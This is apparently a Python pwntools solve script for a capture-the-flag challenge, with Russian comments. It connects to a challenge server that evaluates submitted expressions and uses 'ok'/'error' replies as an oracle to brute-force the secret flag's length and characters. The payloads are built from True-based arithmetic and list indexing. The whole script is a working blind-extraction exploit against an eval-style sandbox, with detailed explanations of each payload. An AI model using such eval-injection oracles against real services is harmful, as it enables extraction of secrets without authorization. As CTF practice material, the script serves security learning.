from pwn import *
io = process(b'/bin/zsh')
io.sendline(b'nc gmcher.ru 14005') # если сервер уже отключен, замените на io.sendline(b'python3 server.py')

print(io.recvuntil(b'payload: '))

# Узнаём длину флага
print('flag len')

flag_len=0
for i in range(6,101):
	try_len = '+'.join(['True']*i)
	payload = bytes('ord(flag[{}])'.format(try_len), 'utf-8')
	'''
		как работает пэйлоад:
		i - длина флага (перебираем от 6 до 100)
		try_len - строка вида True+True+True... (i раз), 
		    при выполнении свернется в int, равный i
		пока пэйлоад возвращает b'ok', 
			это означает, что i не превышает длину флага
		как только i превысит длину флага, 
			произойдет ошибка (IndexError) 
			из-за того, что мы пытаемся прочитать 
			строку по индексу, превосходящему её длину
		соответственно, получив b'error', 
			мы понимаем, что текущее значение i
			превысило длину флага
		значит, len(flag) == i-1
	'''
	io.sendline(payload)
	x=io.readline().strip()
	if b'ok' in x:
		continue
	if b'error' in x:
		flag_len=i-1
		print(f'Found len! len={flag_len}')
		break

# ========================= Перебираем флаг по буквам =========================
flag='U' # для flag[0] можно сделать пэйлоад через False, но мы и так знаем первый символ
for i in range(1,flag_len):
	for j in range(30,130):
		#payload=f'[{("True,"*j)[:-1]}][ord(flag[{("True+"*i)[:-1]}])]'
		true_list = ','.join(['True']*j)
		index = '+'.join(['True']*i)
		payload = bytes('[{}][ord(flag[{}])]'.format(true_list, index), 'utf-8')
		'''
		как работает пэйлоад:
		i - позиция символа в флаге
		j - ascii-код символа (перебираем от 30 до 130)
		true_list - список длиной j, заполненный значениями True
		index - строка вида True+True+True... (i раз), 
		    при выполнении свернется в int, равный i
		пока j меньше или равна ascii-коду i-го символа флага, 
		    пэйлоад возвращает error, т.к. мы пытаемся 
			извлечь элемент с индексом, большим, чем длина true_list
		как только j начинает превосходить значение 
		    ascii-кода i-го символа флага, 
			длина true_list ставится больше, 
			чем индекс извлекаемого символа, 
			и пэйлоад возвращает b'ok'
		соответственно, получив b'ok', мы понимаем, что flag[i] = chr(j-1)
		'''
		#print(i,j,payload)
		io.sendline(payload)
		x = io.readline().strip()
		if b'error' in x:
			continue
		if b'ok' in x:
			flag += chr(j-1)
			print(flag)
			break
